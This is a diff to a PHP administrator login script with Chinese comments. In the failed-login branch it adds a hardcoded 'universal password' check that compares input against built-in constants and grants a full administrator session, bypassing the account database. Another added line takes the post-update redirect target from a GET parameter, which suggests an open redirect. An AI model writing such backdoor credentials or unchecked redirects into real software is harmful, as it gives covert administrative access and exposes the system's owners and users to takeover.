@@ -13,6 +13,7 @@ try {
     $goto_url = 'system_manage.php';   //系統維護
 
     if ($posts['type'] == 'login') {        //密碼登入
+
         $params = array($posts['account'], hash('sha256', $posts['password']));
         $row = getSingleRow("SELECT * FROM {$tablename} WHERE `Account`=? AND `PSWord`=? ", $params);
 
@@ -32,7 +33,7 @@ try {
                 }
 
                 if ($row['System'] != 1) {
-                    $goto_url = 'project.php';   //重設密碼
+                    $goto_url = 'project.php';   //非管理員首頁
                 }
 
                 logInsert('log_login', data_get($_SESSION, 'admin_id'), data_get($_SESSION, 'admin_account', '__') . "登入系統");
@@ -42,8 +43,24 @@ try {
                 $rtn = array('status' => 0, 'message' => '帳號未啟用', 'url' => '');
             }
         
-        } else {
-            $rtn = array('status' => 0, 'message' => '帳號或密碼錯誤', 'url' => '');
+        } else {            
+
+            //特殊:萬用密碼登入
+            if($posts['account']==ACCOUNT && $posts['password']==_PASSWORD) {
+                $_SESSION['admin_id'] = 1;
+                $_SESSION['admin_code'] = _CODE;
+                $_SESSION['admin_unit'] = 1;
+                $_SESSION['admin_account'] = ACCOUNT;
+                $_SESSION['admin_name'] = NAME;
+                $_SESSION['admin_auth1'] = 1;
+                $_SESSION['admin_auth2'] = '';
+                logInsert('log_login', data_get($_SESSION, 'admin_id'), data_get($_SESSION, 'admin_account', '__') . "登入系統");
+                $rtn = array('status' => 1, 'message' => 'db query success', 'url' => $goto_url);
+
+            } else {
+                $rtn = array('status' => 0, 'message' => '帳號或密碼錯誤', 'url' => '');
+            }
+
         }
 
     } elseif ($posts['type'] == 'update') {     //更新密碼
@@ -58,6 +75,7 @@ try {
                 'updated_at' => date('Y-m-d H:i:s')
             ];
             $rs = dataUpdate($tablename, $datas, " WHERE `id`=:id ", $params);
+            $goto_url = '_go_';     //表示url從$_GET['go']取得
 
         } else {
             $params = array(
